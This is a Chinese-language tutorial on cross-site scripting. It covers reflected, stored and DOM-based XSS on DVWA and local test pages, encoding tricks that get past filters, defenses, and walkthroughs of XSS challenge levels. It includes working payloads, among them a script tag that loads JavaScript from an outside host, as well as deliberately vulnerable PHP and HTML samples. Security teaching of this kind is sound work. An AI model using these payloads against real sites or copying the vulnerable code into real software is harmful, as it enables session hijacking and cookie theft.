# XSS那些事儿

## XSS简介

XSS被称为跨站脚本攻击（Cross-Site Scripting，由于和CSS（层叠样式表Cascading Style Sheets）重名，故简称为XSS。
从OWASP组织公布的TOP10漏洞中，我们也能发现，XSS一直是名列靠前的漏洞之一。

![][1]

XSS最大的特点就是能注入恶意的HTML/JavaScript代码到用户的网页上，从而达到劫持用户会话的目的。不严格地讲，XSS也是注入的一种，HTML注入。由于HTML代码和客户端JavaScript脚本能在受害者主机上的浏览器任意执行，这样等同于完全控制了Web客户端的逻辑，在这个基础上，黑客或者攻击者可以轻易地发动各种各样的攻击。

在讲XSS之前，我们先说一下浏览器的同源策略。

所谓同源策略，是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。
如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。

![][2]

同domain,同端口，同协议视为同一个域，一个域内的脚本仅仅具有本域内的权限，可以理解为本域脚本只能读写本域内的资源，而无法访问其它域的资源。但有些时候我们看到img，script，style等标签，都允许跨域引用资源，严格说这是不符合同源要求的。然而，其实只是引用这些资源而已，并不能读取这些资源的内容。

说了这么多，到底XSS是什么样子呢？先看一下，我们输入一个恶意Payload,来执行输入的HTML标签。

![][3]

这里便是一个可控的输入点，我们输入<img src=x onerror=alert(/XSS/)>,发现成功弹窗了。

![][4]

## XSS漏洞的危害

那么XSS到底有哪些危害呢，一起来看

- 1 网络钓鱼，包括盗取各类用户账号
- 2 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作
- 3 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等
- 4 强制弹出广告页面、刷流量等
- 5 网页挂马
- 6 传播跨站脚本蠕虫等
- 7 结合其他漏洞，如CSRF漏洞，实施进一步作恶
- 8 其他各种恶意操作等

以往，XSS跨站脚本一直被当做是一类鸡肋漏洞没有什么好利用的地方，只能弹出对话框而已，稍微有点危害的就是用来盗取用户Cookies资料和网页挂马。另外通常情况下，我们通过注入alert(/XSS/)之类的JavaScript代码，实际上并没有反映其危害性，只是证明其存在性。

相较而言，乙方对于XSS确实没有引起足够高的重视。诚然，XSS不如SQL注入、文件上传等直接获取较高权限，甚至getshell；但是它的运用方式相当灵活，构造的恶意代码也多式多样，只要开拓思维，适当结合其他技术一起运用，XSS的危害还是很大的。

## XSS漏洞的类型

那么XSS到底有哪几种类型呢

可以分为两种类型：

- 非持久性攻击
- 持久性攻击

非持久型XSS攻击：顾名思义，非持久型XSS攻击是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。

持久型XSS攻击：持久型XSS，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。

当然我们也可以划分为如下三种类型：

- 反射型XSS,经过后端，不经过数据库
- 存储型XSS,经过后端，经过数据库
- DOM型XSS,不经过后端，基于文档对象模型(DOM),通过传入参数修改DOM结构，从而浏览器解析执行脚本

这里我们利用DVWA来分别对反射型和存储型XSS进行验证。

### 反射型XSS

在输入框输入可执行的JavaScript脚本，这里远程加载JavaScript，测试代码如下:


```javascript
<script src= http://victorsec.top/xss.js></script>
```

![][5]

反射型XSS,不会持久，构造的Payload也只会执行一次。

反射型 XSS 的数据流向是：浏览器 -> 后端 -> 浏览器

### 存储型XSS

存储型XSS,顾名思义就是将恶意代码存储到数据库中，只要访问页面，恶意代码即可执行。由此可以看出，存储型XSS的危害就比反射型XSS大很多。我们依然利用DVWA的存储XSS漏洞，输入测试代码如下：

![][6]

点击执行，会将Payload存储到数据库中，每次刷新页面都会执行恶意脚本。

![][7]

我们可以看出，存储行 XSS 的数据流向是：
浏览器 -> 后端 -> 数据库 -> 后端 -> 浏览器。

### DOM XSS

DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。

可以触发DOM XSS的属性有：

- document.referer属性
- window.name属性
- location属性
- innerHTML属性
- documen.write属性等

这里我们以document.write和innerHTML为例，在本地搭建DOM XSS演示

#### 代码一

```html
    <!DOCTYPE html>
	<html>
    <head>
      <meta charset="utf-8">
      <title></title>
      <script type="text/javascript">
          var s=location.search;          //返回URL中的查询部分（？之后的内容）
            s=s.substring(1,s.length);    //返回整个查询内容
          var url="";                     //定义变量url
          if(s.indexOf("url=")>-1){       //判断URL是否为空
            var pos=s.indexOf("url=")+4;  //过滤掉"url="字符
            url=s.substring(pos,s.length); //得到地址栏里的url参数
          }else{
            url="url参数为空";
          }
      </script>
    </head>
    <body>
      <div id='test'> </div>
       <script type="text/javascript">document.getElementById("test").innerHTML="我的url是: "+url; </script>
    </body>
  	</html>
```

完整URL如下：


```html
http://127.0.0.1/xsstest2.html?url=&lt;img src=x onerror=alert(666)&gt;
```

通过浏览器传入参数url，向DOM中div内写入值，从而触发DOM XSS


![][8]


#### 代码二 

```html
    <!DOCTYPE html>
	<html>
  	<head>
    <meta charset="utf-8">
    <title></title>
    <script type="text/javascript">
        var s=location.search;          //返回URL中的查询部分（？之后的内容）
          s=s.substring(1,s.length);    //返回整个查询内容
        var url="";                     //定义变量url
        if(s.indexOf("url=")>-1){       //判断URL是否为空 
          var pos=s.indexOf("url=")+4;  //过滤掉"url="字符
          url=s.substring(pos,s.length); //得到地址栏里的url参数
        }else{
          url="url参数为空";
        }
        document.write("url: <a href='"+url+"'>"+url+"</a>");  //输出
    </script>
	</head>
	<body>
	</body>
	</html>
```

通过浏览器url传入参数的值，从而写入DOM中，Javascript执行恶意代码，从而产生DOM XSS

完整URL如下：


```html
http://127.0.0.1/xsstest3.html?url=&lt;img src=x onerror=alert(666)&gt;
```

![][8]

DOM XSS并没有经过服务端和数据库，只在浏览器前端，通过DOM的操作执行恶意脚本。因此DOM XSS的数据流如下：DOM XSS数据流：URL -> 浏览器

一般来说，反射型XSS经常会出现在登录框、搜索框等输入位置。

而存储型XSS多发生在留言板、评论、博客日志用户交互的位置。

DOM XSS多与document.write、innerHTML相关。

## XSS的防御

XSS产生的原因呢？是由于输入数据的不可控，未对数据进行过滤。
那么我们防御XSS要从以下几个方面着手：

- 输入校验：长度限制、值类型是否正确、是否包含特殊字符（<>”等）、是否包含alert、onclick、script等关键字。
- 输出编码：根据输出的位置进行相应的编码，如HTML编码、JavaScript编码、URL编码。原则是该数据不要超出自己所在的区域，也不要被当做指令执行。
- 考虑set-cookie中设置http-only,避免cookie盗用。

另外对于DOM XSS的防御，避免客户端文档的重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现。

对于防御来说，现在使用的很多框架，都加入了规则，过滤转码，禁止使用document.write、innerHTML等这类函数。但也并不是说一定安全，没有绝对的安全，所谓道高一尺，魔高一丈，漏洞挖掘本身就是模糊测试，需要我们不断研究攻击与防御原理，才能不断更新规则，提高web安全。

很多时候漏洞需要一定的配合方能进行攻击利用，比如现在挖掘到一个self-XSS，只能用来打自己的Cookie等，此时我们可以考虑是否能CSRF（跨站请求伪造），通过将CSRF和self-XSS进行配合利用，便可以实现XSS的威力。再比如当遇到Cookie设置了http-only是否真的无法利用？之前有见过将CORS跨域资源访问配合进行利用，有防御就有攻击，有攻击就会防御，攻防是加强安全的手段。

## XSS的编码问题

既然说到编码，先说一下浏览器常用的几种编码吧

URL编码：一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)

HTML编码：在呈现HTML页面时,有时候需要显示一些特殊的字符,例如”<”和”&”,因为它们是HTML专用字符，需要通过一定的方式来实现，HTML编码由此诞生。HTML编码只是一种函数体现，用于将字符转换成HTML实体。

JavaScript编码：可以采用跟HtmlEncode不同的编码方式，即使用“\”对特殊字符进行转义。也可以转换成对应的字符编码。

js提供了四种字符编码的策略：

- 三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145” 　　
- 两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65” 　　
- 四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065” 　
- 对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）

浏览器解析原理：

浏览器在接收到一个HTML文件时，会从头开始对文档进行解析。遇到javascript时，会调用javascript解析器进行解析。遇到类似Onclick等需要触发才会执行的代码会跳过，事件被触发时才会被解析。

### 案例一：HTML——JS


```php	
	<?php
	function htmlencode($str){
		if(empty($str)) return;
		if($str == "") return;
		$str = str_ireplace("<","",$str);
		$str = str_ireplace(">","",$str);
		$str = str_ireplace("script","",$str);
   		$str = str_ireplace("img","",$str);
   		$str = str_ireplace(":","",$str);
   		$str = str_ireplace("javascript","",$str);
 	
   		return $str;
	}


	if(!array_key_exists ("name",$_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
	$isempty = true;

	} else {
             
	 $html = '<pre>';
	 $html .= '<a onclick=" ' .htmlencode($_GET['name']).'">click this url</a>';
	 $html .= '</pre>';
 
	}

	echo @$html;
	?>
```

这里我们先看name所在的环境，通过url传入参数，然后在html标签里，先进行html解码，然后进行js解码，于是我们考虑对输入的url参数进行html编码，从而可以在进行js解码之前还原参数，从而js执行恶意代码

这里搭建环境只是测试不同环境下的xss解码顺序，由于html编码包含&和#，我们需要先对url参数进行url编码
，然后url参数在服务端解码，然后绕过对javascript等字符的过滤，然后在浏览器解析时造成解码差执行

%26%23x6A%3b%26%23x61%3b%26%23x76%3b%26%23x61%3b%26%23x73%3b%26%23x63%3b%26%23x72%3b%26%23x69%3b%26%23x70%3b%26%23x74%3b%26%23x3A%3b%26%23x61%3b%26%23x6C%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x29%3b

然后查看源代码可以看到：

![][19]

onclick事件需要点击才会执行，先html解码，然后js解码，从而执行弹窗

![][20]

## 案例二：JS——HTML ##

```html
    <html>

	<?php
	if(!array_key_exists ("name",$_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
   		$isempty = true;
	} else {
	$value = $_GET['name'];
	$html = '<pre>';
	$html .= "Your Name is :
       <div id='a'></div>
       <script>
           document.getElementById('a').innerHTML= "."'".htmlspecialchars($value)."'".";
       </script>
	";
	$html .= '</pre>';
 
	}
	echo @$html;
	?>

	</html>
```

这里我们先分析value的环境，通过url参入参数，在script内，先进行js解码，然后写入html内进行html解码
于是考虑将payload进行js解码，此时便可以绕过html的实体编码

如果我们输入以往payload，会发现htmlspecialchars函数对value的特殊字符进行了实体编码

```html
    <html>

	<pre>Your Name is :
       <div id='a'></div>
       <script>
           document.getElementById('a').innerHTML= '&lt;img src=x onerror=alert(1)&gt;';
       </script>
 	</pre>

	</html>
```

于是我们构造payload，对url传入的参数先进行js编码


```javascript
\x3cimg src=x onerror=alert(1)\3e
```

从而绕过服务端对特殊字符的编码，在浏览器中先进行js解码，然后进行html解码，从而执行

![][21]

通过以上两个案例，我们对XSS的解码环境有了一个简单了解，以后在防御或者绕过XSS的时候，都可以做到在正确的环境内使用适当的编码

> 很多不了解html、js编码的童鞋挖掘xss漏洞时，都是一顿乱插，姿势对了，就能获得快感，姿势不对，就么反应

## XSS过关挑战

说了这么多，我已经迫不及待想找个留言板，输入框进行XSS测试了怎么办？

下面有个XSS过关挑战，从Level1到Level20，这里我们一起看一下前三关。

### Level 1 

![][11]


```html
http://127.0.0.1/xss/level1.php?name=test
```

这里我们给name参数传入&lt;img src=x onerror=alert(1)&gt; 从而成功过关

此时看下第一关的服务端代码：

```html
    <!DOCTYPE html><!--STATUS OK--><html>
	<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<script>
	window.alert = function()  
	{     
	confirm("完成的不错！");
	 window.location.href="level2.php?keyword=test"; 
	}
	</script>
	<title>欢迎来到level1</title>
	</head>
	<body>
	<h1 align=center>欢迎来到level1</h1>
	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["name"];
	echo "<h2 align=center>欢迎用户".$str."</h2>";
	?>
	<center><img src=level1.png></center>
	<?php 
	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
	?>
	</body>
	</html>
```

发现并没有对name参数进行过滤编码等，从而用最简单的payload可以弹窗

### Level 2

![][13]

如法炮制，利用第一关payload发现，并没有执行弹窗，于是查看网页源码：

```html
    <!DOCTYPE html><!--STATUS OK--><html>
	<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<script>
	window.alert = function()  
	{     
	confirm("完成的不错！");
	 window.location.href="level3.php?writing=wait"; 
	}
	</script>
	<title>欢迎来到level2</title>
	</head>
	<body>
	<h1 align=center>欢迎来到level2</h1>
	<h2 align=center>没有找到和&lt;img src=x onerror=alert(1)&gt;相关的结果.</h2><center>
	<form action=level2.php method=GET>
	<input name=keyword  value="<img src=x onerror=alert(1)>">
	<input type=submit name=submit value="搜索"/>
	</form>
	</center><center><img src=level2.png></center>
	<h3 align=center>payload的长度:28</h3></body>
	</html>
```

发现value值需要进行闭合操作

于是构造payload如下：">&lt;img src=x onerror=alert(1)&gt;<"  成功执行

![][15]


### Level 3

![][16]

输入构造的payload，查看网页源代码发现进行了html实体编码

```html
    <!DOCTYPE html><!--STATUS OK--><html>
	<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<script>
	window.alert = function()  
	{     
	confirm("完成的不错！");
	 window.location.href="level4.php?keyword=try harder!"; 
	}
	</script>
	<title>欢迎来到level3</title>
	</head>
	<body>
	<h1 align=center>欢迎来到level3</h1>
	<h2 align=center>没有找到和&lt;img src=x onerror=alert(1)&gt;相关的结果.</h2><center>
	<form action=level3.php method=GET>
	<input name=keyword  value='&lt;img src=x onerror=alert(1)&gt;'>
	<input type=submit name=submit value=搜索 />
	</form>
	</center><center><img src=level3.png></center>
	<h3 align=center>payload的长度:28</h3></body>
	</html>
```

于是考虑利用on事件来触发弹窗，闭合后payload如下：

'onmouseover='alert(1)' 通过鼠标移动事件来执行弹窗操作

![][18]

做完之后我们再看下服务端的代码如下：


```html
    <!DOCTYPE html><!--STATUS OK--><html>
	<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<script>
	window.alert = function()  
	{     
	confirm("完成的不错！");
	 window.location.href="level4.php?keyword=try harder!"; 
	}
	</script>
	<title>欢迎来到level3</title>
	</head>
	<body>
	<h1 align=center>欢迎来到level3</h1>
	<?php 
	ini_set("display_errors", 0);
	$str = $_GET["keyword"];
	echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
	<form action=level3.php method=GET>
	<input name=keyword  value='".htmlspecialchars($str)."'>
	<input type=submit name=submit value=搜索 />
	</form>
	</center>";
	?>
	<center><img src=level3.png></center>
	<?php 
	echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
	?>
	</body>
	</html>
```

这里利用php的htmlspecialchars函数对传入参数进行实体编码，这个参数有一个特性就是默认的如果不指定的话，并不会对'进行编码，只对"进行编码，于是可以构造闭合标签。另外关于XSS的挑战还有很多，感兴趣的童鞋可以下载源码搭环境进行测试。

[代码下载](./resources/xss.zip)

## 结束语

本文只是从个人角度对XSS进行简单介绍，并未对XSS进行深入研究。XSS对于Web前端安全来说，显得尤为重要，不论是各种新奇的配合利用，还是各种姿势的bypass，都值得去探索。

Web安全之XSS是前端安全重要的一环，需要引起足够的重视。XSS运用灵活，姿势多变，配合CSRF等漏洞，可能产生不一样的效果。

[1]: resources/xss1.png
[2]: resources/xss2.png
[3]: resources/xss3.png
[4]: resources/xss4.png
[5]: resources/xss5.png
[6]: resources/xss6.png
[7]: resources/xss7.png
[8]: resources/xss8.png
[9]: resources/xss9.png
[10]: resources/xss10.png
[11]: resources/xss11.png
[12]: resources/xss12.png
[13]: resources/xss13.png
[14]: resources/xss14.png
[15]: resources/xss15.png
[16]: resources/xss16.png
[17]: resources/xss17.png
[18]: resources/xss18.png
[19]: resources/xss19.png
[20]: resources/xss20.png
[21]: resources/xss21.png
